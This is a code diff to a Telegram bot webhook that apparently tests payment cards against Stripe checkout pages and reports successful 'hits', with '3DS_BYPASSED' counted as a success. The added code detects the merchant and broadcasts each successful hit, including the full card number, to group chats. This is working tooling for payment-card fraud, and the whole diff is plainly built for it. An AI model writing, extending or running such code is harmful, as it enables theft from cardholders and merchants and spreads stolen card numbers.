@@ -61,6 +61,8 @@ const {
   getUserRank,
   setUserData,
   getUserData,
+  sendHitToGroups,
+  detectMerchant,
 } = require('../services/telegramService');
 
 // Import checkout service
@@ -568,7 +570,7 @@ router.post('/webhook', async (req, res) => {
               resultText = `🎯 𝗛𝗜𝗧 𝗖𝗛𝗔𝗥𝗚𝗘𝗗 ✅\n\n`;
               resultText += `「❃」 𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 : Charged\n`;
               resultText += `「❃」 𝗔𝗺𝗼𝘂𝗻𝘁 : ${amount} ${currency}\n`;
-              resultText += `「❃」 𝗠𝗲𝗿𝗰𝗵𝗮𝗻𝘁 : ${parsed.sessionId ? 'Stripe Checkout' : 'Unknown'}\n`;
+              resultText += `「❃」 𝗠𝗲𝗿𝗰𝗵𝗮𝗻𝘁 : ${detectMerchant(checkoutUrl)}\n`;
               resultText += `「❃」 𝗘𝗺𝗮𝗶𝗹 : ${tgId}@user.bot\n`;
               resultText += `「❃」 𝗕𝗜𝗡 :- ${bin}\n`;
               resultText += `「❃」 𝗛𝗶𝘁 𝗕𝘆 : ${tgId}\n`;
@@ -638,10 +640,30 @@ router.post('/webhook', async (req, res) => {
             // Send result for this card
             await sendMessage(BOT_TOKEN, chatId, resultText);
 
-            // If successful, increment hits
+            // If successful, increment hits and send group notifications
             if (result.success && (result.status === 'CHARGED' || result.status === '3DS_BYPASSED')) {
               console.log('[CO_COMMAND] Successful checkout, incrementing hits for user:', tgId);
               incrementUserHits(tgId);
+
+              // Send hit notification to group chats
+              const hitData = {
+                userId: tgId,
+                userName: getUserName(tgId) || 'User',
+                card: cardData.split('|')[0], // Full card number
+                bin: undefined, // Will be extracted in sendHitToGroups
+                binMode: undefined, // For future BIN mode support
+                amount: result.amount ? (result.amount / 100).toFixed(2) : '9.99',
+                attempts: 1, // Single card attempt
+                timeTaken: 'Instant', // Could be enhanced to track actual time
+                merchant: detectMerchant(checkoutUrl)
+              };
+
+              try {
+                await sendHitToGroups(hitData, checkoutUrl);
+                console.log('[CO_COMMAND] Group notifications sent for successful hit');
+              } catch (groupError) {
+                console.error('[CO_COMMAND] Failed to send group notifications:', groupError);
+              }
             }
 
             // Small delay between cards to avoid rate limiting
